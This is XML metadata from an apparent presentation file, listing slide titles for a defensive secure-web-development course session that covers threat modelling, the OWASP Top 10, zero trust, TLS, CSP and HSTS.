      <vt:lpstr>Session 1: Security Refresher, Secure Application Architecture, &amp; HTTP Foundations</vt:lpstr>
      <vt:lpstr>Lesson 01 - Security Refresher Topic 01 – Assets, Attackers, and Abuse-Case Thinking</vt:lpstr>
      <vt:lpstr>1.1.1 - What Are we Protecting?</vt:lpstr>
      <vt:lpstr>1.1.1 - What is security, really?</vt:lpstr>
      <vt:lpstr>1.1.1 - Confidentiality</vt:lpstr>
      <vt:lpstr>1.1.1 - Integrity</vt:lpstr>
      <vt:lpstr>1.1.1 - Availability</vt:lpstr>
      <vt:lpstr>Knowledge Check</vt:lpstr>
      <vt:lpstr>1.1.1 - Assets</vt:lpstr>
      <vt:lpstr>1.1.1 - Asset examples</vt:lpstr>
      <vt:lpstr>1.1.1 - Threat Actors</vt:lpstr>
      <vt:lpstr>1.1.1 - Script  Kiddies</vt:lpstr>
      <vt:lpstr>1.1.1 - Insiders</vt:lpstr>
      <vt:lpstr>1.1.1 - Hacktivists</vt:lpstr>
      <vt:lpstr>1.1.1 - Cyber Gangs/Criminals</vt:lpstr>
      <vt:lpstr>1.1.1 - Nation states / APTs</vt:lpstr>
      <vt:lpstr>1.1.1 - Thought Experiment</vt:lpstr>
      <vt:lpstr>1.1.1 - Abuse Case-Thinking</vt:lpstr>
      <vt:lpstr>1.1.1 - Abuse Case-Thinking Template</vt:lpstr>
      <vt:lpstr>1.1.1 - Mini  Lab</vt:lpstr>
      <vt:lpstr>Lesson 01 - Security Refresher Topic 02 – Data Classifications, DFD's, &amp; Trust Boundaries</vt:lpstr>
      <vt:lpstr>1.1.2 - Data Classifications</vt:lpstr>
      <vt:lpstr>1.1.2 - Data Classification Level 1</vt:lpstr>
      <vt:lpstr>1.1.2 - Data Classification Level 2</vt:lpstr>
      <vt:lpstr>1.1.2 - Data Classification Level 3</vt:lpstr>
      <vt:lpstr>1.1.2 - Data Classification Level 4</vt:lpstr>
      <vt:lpstr>1.1.2 - Data Classification – Why Classify?</vt:lpstr>
      <vt:lpstr>1.1.2 - Data Flow Diagrams (DFD's)</vt:lpstr>
      <vt:lpstr>1.1.2 - DFD Uses</vt:lpstr>
      <vt:lpstr>1.1.2 - Trust boundaries in DFD's</vt:lpstr>
      <vt:lpstr>1.1.2 - Trust boundaries - Common examples</vt:lpstr>
      <vt:lpstr>1.1.2 - Trust boundaries - Common examples</vt:lpstr>
      <vt:lpstr>Lesson 01 - Security Refresher Topic 03 – The OWASP Top 10</vt:lpstr>
      <vt:lpstr>1.1.4 - The OWASP Top 10</vt:lpstr>
      <vt:lpstr>1.1.4 - A01:2025</vt:lpstr>
      <vt:lpstr>1.1.4 - A02:2025</vt:lpstr>
      <vt:lpstr>1.1.4 - A03:2025</vt:lpstr>
      <vt:lpstr>1.1.4 - A04:2025</vt:lpstr>
      <vt:lpstr>1.1.4 - A05:2025</vt:lpstr>
      <vt:lpstr>1.1.4 - A06:2025</vt:lpstr>
      <vt:lpstr>1.1.4 - A08:2025</vt:lpstr>
      <vt:lpstr>1.1.4 - A09:2025</vt:lpstr>
      <vt:lpstr>1.1.4 - A10:2025</vt:lpstr>
      <vt:lpstr>Lesson 01 - Security Refresher Topic 04 – Threat Modelling – the STRIDE Framework &amp; STRIDE-lite for Web API's 1.2.5</vt:lpstr>
      <vt:lpstr>1.1.4 - The STRIDE Framework</vt:lpstr>
      <vt:lpstr>1.1.4 - The STRIDE Acronym</vt:lpstr>
      <vt:lpstr>1.1.4 - STRIDE Analogy</vt:lpstr>
      <vt:lpstr>1.1.4 - Common STRIDE Examples in Code</vt:lpstr>
      <vt:lpstr>1.1.4 - Creating a Threat Model – Step 01</vt:lpstr>
      <vt:lpstr>1.1.4 - Creating a Threat Model – Step 02</vt:lpstr>
      <vt:lpstr>1.1.4 - Creating a Threat Model – Step 02</vt:lpstr>
      <vt:lpstr>1.1.4 - Creating a Threat Model – Step 04</vt:lpstr>
      <vt:lpstr>1.1.4 - Creating a Threat Model – Step 05</vt:lpstr>
      <vt:lpstr>1.1.4 - Creating a Threat Model – Step 06</vt:lpstr>
      <vt:lpstr>1.1.4 - Creating a Threat Model – Step 07</vt:lpstr>
      <vt:lpstr>1.1.4 - Creating a Threat Model – Step 08</vt:lpstr>
      <vt:lpstr>1.1.4 - Creating a Threat Model – Step 09</vt:lpstr>
      <vt:lpstr>1.1.4 - Creating a Threat Model – Step 10</vt:lpstr>
      <vt:lpstr>1.1.4 - Creating a Threat Model – Step 11</vt:lpstr>
      <vt:lpstr>1.1.4 - Creating a Threat Model – Step 12</vt:lpstr>
      <vt:lpstr>Lesson 02 – Secure Web Architecture Refresher  Topic 01 – Monolith vs Microservices vs Serverless Pattern Security</vt:lpstr>
      <vt:lpstr>1.2.1 - Monoliths</vt:lpstr>
      <vt:lpstr>1.2.1 - Monolith Security Concerns 01</vt:lpstr>
      <vt:lpstr>1.2.1 - Monolith Security Concerns 02</vt:lpstr>
      <vt:lpstr>1.2.1 - Monolith Security Concerns 03</vt:lpstr>
      <vt:lpstr>1.2.1 - Monolith Security Concerns 04</vt:lpstr>
      <vt:lpstr>1.2.1 - Monolith Security Concerns 05</vt:lpstr>
      <vt:lpstr>1.2.1 - Monolith Security Concerns 06</vt:lpstr>
      <vt:lpstr>1.2.1 - Monolith Security Concerns 07</vt:lpstr>
      <vt:lpstr>1.2.1 - Monolith Security Overview</vt:lpstr>
      <vt:lpstr>1.2.1 - Microservices</vt:lpstr>
      <vt:lpstr>1.2.1 - MS Security Concerns 01</vt:lpstr>
      <vt:lpstr>1.2.1 - MS Security Concerns 02</vt:lpstr>
      <vt:lpstr>1.2.1 - MS Security Concerns 03</vt:lpstr>
      <vt:lpstr>1.2.1 - MS Security Concerns 04</vt:lpstr>
      <vt:lpstr>1.2.1 - MS Security Concerns 05</vt:lpstr>
      <vt:lpstr>1.2.1 - MS Security Concerns 06</vt:lpstr>
      <vt:lpstr>1.2.1 - Serverless</vt:lpstr>
      <vt:lpstr>1.2.1 - Serverless Security Concerns 01</vt:lpstr>
      <vt:lpstr>1.2.1 - Serverless Security Concerns 02</vt:lpstr>
      <vt:lpstr>1.2.1 - Serverless Security Concerns 03</vt:lpstr>
      <vt:lpstr>1.2.1 - Serverless Security Concerns 04</vt:lpstr>
      <vt:lpstr>1.2.1 - Serverless Security Concerns 05</vt:lpstr>
      <vt:lpstr>1.2.1 - Serverless Security Concerns 06</vt:lpstr>
      <vt:lpstr>Lesson 02 – Secure Web Architecture Refresher  Topic 02 – East-West traffic, Zero Trust, Least Privilege</vt:lpstr>
      <vt:lpstr>1.2.2 - North-South traffic</vt:lpstr>
      <vt:lpstr>1.2.2 - East-West traffic</vt:lpstr>
      <vt:lpstr>1.2.2 - East-West Security Implications 01</vt:lpstr>
      <vt:lpstr>1.2.2 - East-West Security Implications 02</vt:lpstr>
      <vt:lpstr>1.2.2 - East-West Security Implications 03</vt:lpstr>
      <vt:lpstr>1.2.2 - East-West Security Implications 04</vt:lpstr>
      <vt:lpstr>1.2.2 - Zero Trust Architecture</vt:lpstr>
      <vt:lpstr>1.2.2 - the Principle of Least Privilege (POLP)</vt:lpstr>
      <vt:lpstr>1.2.2 - the Risks of Excess</vt:lpstr>
      <vt:lpstr>1.2.2 - the Minimalist Mindset</vt:lpstr>
      <vt:lpstr>1.2.2 - ZTA – What it is/is not</vt:lpstr>
      <vt:lpstr>1.2.2 - ZTA Core Concept</vt:lpstr>
      <vt:lpstr>1.2.2 - ZTA Principles – 01</vt:lpstr>
      <vt:lpstr>1.2.2 - ZTA Principles – 02</vt:lpstr>
      <vt:lpstr>1.2.2 - ZTA Principles – 03</vt:lpstr>
      <vt:lpstr>1.2.2 - ZTA Principles – 04</vt:lpstr>
      <vt:lpstr>1.2.2 - ZTA Principles – 05</vt:lpstr>
      <vt:lpstr>1.2.2 - E-W Traffic in Code Security </vt:lpstr>
      <vt:lpstr>1.2.2 - ZTA in Code Security</vt:lpstr>
      <vt:lpstr>1.2.2 - POLP in Code Security</vt:lpstr>
      <vt:lpstr>1.2.2 - In Summary</vt:lpstr>
      <vt:lpstr>Lesson 02 – Secure Web Architecture Refresher  Topic 03 – Attack Surface, API Gateways &amp; Service Meshes, Layered Security</vt:lpstr>
      <vt:lpstr>1.2.4 - Attack Surface</vt:lpstr>
      <vt:lpstr>1.2.4 - Modern Web Attack Surface 01</vt:lpstr>
      <vt:lpstr>1.2.4 - Modern Web Attack Surface 02</vt:lpstr>
      <vt:lpstr>1.2.4 - Modern Web Attack Surface 04</vt:lpstr>
      <vt:lpstr>1.2.4 - Modern Web Attack Surface 05</vt:lpstr>
      <vt:lpstr>1.2.4 - Modern Web Attack Surface 06</vt:lpstr>
      <vt:lpstr>1.2.4 - Key Takeaway</vt:lpstr>
      <vt:lpstr>1.2.4 - Mapping OWASP + AS</vt:lpstr>
      <vt:lpstr>1.2.4 - Mapping OWASP + AS</vt:lpstr>
      <vt:lpstr>1.2.4 - Mapping OWASP + AS</vt:lpstr>
      <vt:lpstr>1.2.4 - Mapping OWASP + AS</vt:lpstr>
      <vt:lpstr>1.2.3 - API Gateways</vt:lpstr>
      <vt:lpstr>1.2.3 - API Gateways as security tools</vt:lpstr>
      <vt:lpstr>1.2.3 - API Gateway Security Benefits 01</vt:lpstr>
      <vt:lpstr>1.2.3 - API Gateway Security Implications 01</vt:lpstr>
      <vt:lpstr>1.2.3 - API Gateway Security Implications 02</vt:lpstr>
      <vt:lpstr>1.2.3 - API Gateway Security Implications 02</vt:lpstr>
      <vt:lpstr>1.2.3 - The Service Mesh</vt:lpstr>
      <vt:lpstr>1.2.3 - Sidecar Proxies</vt:lpstr>
      <vt:lpstr>1.2.3 - Service Mesh Capabilities</vt:lpstr>
      <vt:lpstr>1.2.3 - Service Mesh Security Benefits</vt:lpstr>
      <vt:lpstr>1.2.3 - Service Mesh Challenges/Risks</vt:lpstr>
      <vt:lpstr>1.2.3 - Defense in Depth</vt:lpstr>
      <vt:lpstr>1.2.3 - Defense in Depth – Users &amp; Identity</vt:lpstr>
      <vt:lpstr>1.2.3 - Defense in Depth – Application</vt:lpstr>
      <vt:lpstr>1.2.3 - Defense in Depth – Service to Service</vt:lpstr>
      <vt:lpstr>1.2.3 - Defense in Depth – Data layer</vt:lpstr>
      <vt:lpstr>1.2.3 - Defense in Depth – Key Takeaway</vt:lpstr>
      <vt:lpstr>Lesson 03 – HTTPS &amp; TLS  Topic 01 – HTTP and TLS</vt:lpstr>
      <vt:lpstr>1.2.3 - HTTP Refresher</vt:lpstr>
      <vt:lpstr>1.3.1 - DEMO</vt:lpstr>
      <vt:lpstr>1.3.1 - HTTP Statelessness</vt:lpstr>
      <vt:lpstr>1.3.1 - HTTP Security - SSL</vt:lpstr>
      <vt:lpstr>1.3.1 - HTTP Security - TLS</vt:lpstr>
      <vt:lpstr>1.3.1 - TLS for Confidentiality</vt:lpstr>
      <vt:lpstr>1.3.1 - TLS for Integrity</vt:lpstr>
      <vt:lpstr>1.3.1 - TLS for Authentication</vt:lpstr>
      <vt:lpstr>1.3.1 - TLS 1.0 (1999) &amp; 1.1 (2006)</vt:lpstr>
      <vt:lpstr>1.3.1 - TLS 1.2 (2008)</vt:lpstr>
      <vt:lpstr>1.3.1 - TLS 1.2 configurations</vt:lpstr>
      <vt:lpstr>1.3.1 - TLS 1.2 configurations</vt:lpstr>
      <vt:lpstr>1.3.1 - TLS 1.2 weaknesses</vt:lpstr>
      <vt:lpstr>1.3.1 - TLS 1.3 (2018)</vt:lpstr>
      <vt:lpstr>1.3.1 - TLS 1.3 fixes</vt:lpstr>
      <vt:lpstr>1.3.1 - TLS 1.3 cipher suites</vt:lpstr>
      <vt:lpstr>1.3.1 - TLS implementation</vt:lpstr>
      <vt:lpstr>Lesson 03 – HTTPS &amp; TLS  Topic 02 – CSP &amp; HSTS: Overview and Implementation Practices</vt:lpstr>
      <vt:lpstr>1.3.1 - CSP Overview</vt:lpstr>
      <vt:lpstr>1.3.1 - CSP Functionality</vt:lpstr>
      <vt:lpstr>1.3.1 - CSP defenses - XSS</vt:lpstr>
      <vt:lpstr>1.3.1 - CSP Defenses – Malicious Endpoints</vt:lpstr>
      <vt:lpstr>1.3.1 - CSP Basic Configuration 01</vt:lpstr>
      <vt:lpstr>1.3.1 - CSP Basic Configuration 02</vt:lpstr>
      <vt:lpstr>1.3.1 - CSP Basic Configuration 03</vt:lpstr>
      <vt:lpstr>1.3.1 - CSP Basic Configuration 04</vt:lpstr>
      <vt:lpstr>1.3.1 - CSP – 'none';</vt:lpstr>
      <vt:lpstr>1.3.1 - CSP Basic Configuration example</vt:lpstr>
      <vt:lpstr>1.3.1 - CSP Nonces &amp; Hashes</vt:lpstr>
      <vt:lpstr>1.3.1 - CSP Nonces</vt:lpstr>
      <vt:lpstr>1.3.1 - Code Example - CSP Nonces 01</vt:lpstr>
      <vt:lpstr>1.3.1 - Code Example - CSP Nonces 02</vt:lpstr>
      <vt:lpstr>1.3.1 - CSP Hashes</vt:lpstr>
      <vt:lpstr>1.3.1 - Code Example - CSP Hashes</vt:lpstr>
      <vt:lpstr>1.3.1 - CSP: strict-dynamic</vt:lpstr>
      <vt:lpstr>1.3.1 - CSP Report-only </vt:lpstr>
      <vt:lpstr>1.3.1 - Why use CSP Report-Only?</vt:lpstr>
      <vt:lpstr>1.3.1 - Why use CSP Report-Only?</vt:lpstr>
      <vt:lpstr>1.3.1 - HSTS Overview</vt:lpstr>
      <vt:lpstr>1.3.1 - HSTS Overview</vt:lpstr>
      <vt:lpstr>1.3.1 - HSTS 'first visit' problem</vt:lpstr>
      <vt:lpstr>1.3.1 - HSTS preload</vt:lpstr>
      <vt:lpstr>1.3.1 - Applying for HSTS preload</vt:lpstr>
      <vt:lpstr>1.3.1 - HSTS - includeSubDomains</vt:lpstr>
      <vt:lpstr>1.3.1 - Example - HSTS config on Nginx</vt:lpstr>
      <vt:lpstr>1.3.1 - HTTPS rollout 01</vt:lpstr>
      <vt:lpstr>1.3.1 - HTTPS rollout 02</vt:lpstr>
      <vt:lpstr>1.3.1 - HTTPS rollout 03</vt:lpstr>
      <vt:lpstr>1.3.1 - HTTPS rollout 04</vt:lpstr>
      <vt:lpstr>1.3.1 - HTTPS rollout 05</vt:lpstr>
      <vt:lpstr>1.3.1 - HTTPS common mistakes 01</vt:lpstr>
      <vt:lpstr>1.3.1 - HTTPS common mistakes 02</vt:lpstr>
      <vt:lpstr>1.3.1 - HTTPS common mistakes 03</vt:lpstr>
      <vt:lpstr>1.3.1 - Key Takeaways</vt:lpstr>
      <vt:lpstr>Session 2: Security Refresher, Secure Application Architecture, &amp; HTTP Foundations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3309</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2025-11-10T12:25:37Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-11-16T11:22:08Z</dcterms:modified>
</cp:coreProperties>
</file>